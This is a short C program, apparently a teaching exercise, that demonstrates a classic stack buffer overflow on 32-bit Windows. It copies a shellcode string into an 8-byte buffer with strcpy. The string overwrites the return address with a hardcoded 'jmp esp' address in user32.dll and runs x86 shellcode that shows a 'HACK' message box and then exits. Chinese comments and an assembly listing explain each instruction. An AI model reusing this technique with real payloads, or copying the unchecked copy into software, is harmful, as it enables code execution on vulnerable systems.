
#include "windows.h"
#include "string.h"
#include "stdlib.h"


char shellcode[] =  "ABCDEFGH"
                    "AAAA"
                    "\x53\x93\xd2\x77" // 在"user32.dll"中 jmp esp 的地址
                    "\x33\xDB\x53\x68\x48\x41\x43\x4B\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77\xFF\xD0\x33\xC0\x50\xB8\x0A\xD2\x81\x7C\xFF\xD0";
/*
                xor ebx,ebx    ; 避免出现 \x00

                push ebx

                push 0x4b434148   ;将 hack 字符串压入栈中

                mov eax,esp

                push ebx

                push eax

                push eax

                push ebx

                mov eax,0x77d507ea

                call eax    ; call MessageBoxA

                xor eax,eax

                push eax

                mov eax,0x7c81d20a

                call eax   ; call ExitProcess
*/



int main(int argc, char *argv[])
{

    char buf[8];
    LoadLibrary("user32");
    strcpy(buf, shellcode);
    return 0;
}

